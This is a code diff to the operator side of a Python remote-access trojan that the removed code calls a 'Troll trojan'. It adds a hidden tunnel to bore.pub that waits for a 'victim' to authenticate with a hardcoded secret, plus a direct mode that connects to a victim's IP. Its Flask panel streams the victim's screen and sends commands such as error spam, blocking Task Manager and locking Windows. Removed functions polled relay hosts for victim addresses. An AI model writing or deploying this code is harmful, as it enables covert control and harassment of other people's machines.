@@ -1,4 +1,5 @@
-import socket, threading, time, sys, urllib.request, webbrowser
+import socket, threading, time, sys, os, urllib.request, webbrowser, subprocess, shutil
+SECRET = "gH7#kL9$mN2@pQ5!rT8&vB4*wZ1"
 from flask import Flask, Response, request, jsonify
 
 latest_jpeg = None
@@ -82,6 +83,8 @@ button{padding:7px 14px;border:none;border-radius:5px;cursor:pointer;font-size:1
 <button class="btn-qck" onclick="send('rick')">Rick Roll</button>
 <button class="btn-qck" onclick="send('fake_virus')">Fake Virus</button>
 <button class="btn-qck" onclick="send('fake_error')">Fake Error</button>
+<button class="btn-qck" onclick="send('error_spam')">Error Spam</button>
+<button class="btn-qck" onclick="send('error_spam_stop')">Stop Spam</button>
 <button class="btn-qck" onclick="send('block_taskmgr')">Block TaskMgr</button>
 <button class="btn-qck" onclick="send('open https://www.youtube.com/watch?v=dQw4w9WgXcQ')">Open URL</button>
 <button class="btn-red" onclick="send('lock_screen')">Windows Locker</button>
@@ -108,46 +111,58 @@ setInterval(function(){fetch('/log').then(r=>r.text()).then(t=>document.getEleme
 </body>
 </html>"""
 
-RELAY_HOST = "d1.proxify.cloud"
-RELAY_PORT = 25154
-
-def relay_recv():
-    targets = [(RELAY_HOST, RELAY_PORT), ("31.77.56.70", RELAY_PORT)]
-    for _ in range(20):
-        for host, port in targets:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)
-                s.connect((host, port))
-                s.sendall(b'GET\n')
-                data = s.recv(4096)
-                s.close()
-                if data:
-                    msg = data.decode().strip()
-                    if 'bore.pub:' in msg or ':' in msg:
-                        return msg
-            except:
-                pass
-        time.sleep(2)
+def find_bore():
+    for p in [shutil.which("bore.exe"), "bore.exe"]:
+        if p and os.path.exists(p):
+            return os.path.abspath(p)
+    meipass = getattr(sys, '_MEIPASS', None)
+    if meipass:
+        p = os.path.join(meipass, "bore.exe")
+        if os.path.exists(p):
+            return p
+    here = os.path.dirname(os.path.abspath(sys.argv[0]))
+    p = os.path.join(here, "bore.exe")
+    if os.path.exists(p):
+        return p
     return None
 
-def relay_list():
-    targets = [(RELAY_HOST, RELAY_PORT), ("31.77.56.70", RELAY_PORT)]
-    for host, port in targets:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((host, port))
-            s.sendall(b'LIST\n')
-            data = s.recv(4096)
-            s.close()
-            if data:
-                msg = data.decode().strip()
-                if msg != 'NONE':
-                    return [u for u in msg.split('\n') if u]
-        except:
-            pass
-    return []
+def bore_listener(server_port):
+    bore_path = find_bore()
+    if not bore_path:
+        return False
+    for bport in range(65535, 64999, -1):
+        proc = subprocess.Popen(
+            [bore_path, "local", str(server_port), "--to", "bore.pub", "--port", str(bport)],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        for line in iter(proc.stdout.readline, b''):
+            txt = line.decode(errors='replace').strip()
+            if 'bore.pub:' in txt and str(bport) in txt:
+                def drain(p=proc):
+                    try:
+                        for _ in iter(p.stdout.readline, b''): pass
+                    except: pass
+                threading.Thread(target=drain, daemon=True).start()
+                return True
+            if 'port already in use' in txt:
+                break
+        proc.terminate()
+    return False
+
+def wait_for_victim(srv):
+    while True:
+        client_sock, addr = srv.accept()
+        buf = b""
+        while b"\n" not in buf:
+            chunk = client_sock.recv(1024)
+            if not chunk: break
+            buf += chunk
+        if buf.strip().decode() == f"AUTH {SECRET}":
+            client_sock.sendall(b"AUTH_OK\n")
+            srv.close()
+            return client_sock
+        client_sock.close()
 
 def screen_reader():
     global latest_jpeg, running, cmd_log
@@ -176,51 +191,9 @@ def screen_reader():
     running = False
     cmd_log.append("! Connection lost")
 
-def main():
+def start_web_ui():
     global sock
-    print("Troll trojan by github.com/Krimex1")
-    mode = input("1 - manual\n2 - auto\n3 - list URLs\nChoose: ").strip()
-    if mode == "3":
-        urls = relay_list()
-        if urls:
-            print("Available URLs:")
-            for u in urls:
-                print(f"  {u}")
-        else:
-            print("No URLs available.")
-        try: input("Press Enter to exit...")
-        except: pass
-        return
-    if mode == "2":
-        print("Connecting to relay...")
-        addr = relay_recv()
-        if not addr:
-            print("Not found.")
-            try: input("Press Enter to exit...")
-            except: pass
-            return
-        print(f"Got URL from relay: {addr}")
-    addr = addr.replace('tcp://', '')
-    try:
-        HOST, PORT = addr.rsplit(':', 1)
-        PORT = int(PORT)
-    except:
-        print(f"Invalid address: {addr}")
-        try: input("Press Enter to exit...")
-        except: pass
-        return
-
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(10)
-        sock.connect((HOST, PORT))
-        print("Connected!")
-    except Exception as e:
-        print(f"Connection failed: {e}")
-        try: input("Press Enter to exit...")
-        except: pass
-        return
-
+    print("Starting web UI...")
     threading.Thread(target=screen_reader, daemon=True).start()
 
     app = Flask(__name__)
@@ -269,5 +242,47 @@ def main():
             pass
         time.sleep(1)
 
+def main():
+    global sock
+    if getattr(sys, 'frozen', False) or '--auto' in sys.argv:
+        mode = "1"
+    else:
+        print("Remote Control Client")
+        print("1 - Start listener (bore + web UI)")
+        print("2 - Direct connect (no bore, enter victim IP:port)")
+        mode = input("Choose: ").strip()
+
+    if mode == "1":
+        print("Client running...", flush=True)
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind(('127.0.0.1', 5000))
+        srv.listen(5)
+        if not bore_listener(5000):
+            input("Press Enter...")
+            return
+        sock = wait_for_victim(srv)
+        start_web_ui()
+    elif mode == "2":
+        addr = input("Enter victim IP:port (e.g. 192.168.1.10:65432): ").strip()
+        if ':' not in addr:
+            return
+        host, port = addr.rsplit(':', 1)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((host, int(port)))
+            start_web_ui()
+        except Exception as e:
+            print(f"Connection failed: {e}")
+            input("Press Enter...")
+
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except Exception as e:
+        import traceback
+        with open("client_error.txt", "w") as f:
+            traceback.print_exc(file=f)
+        input(f"Error: {e}")
+
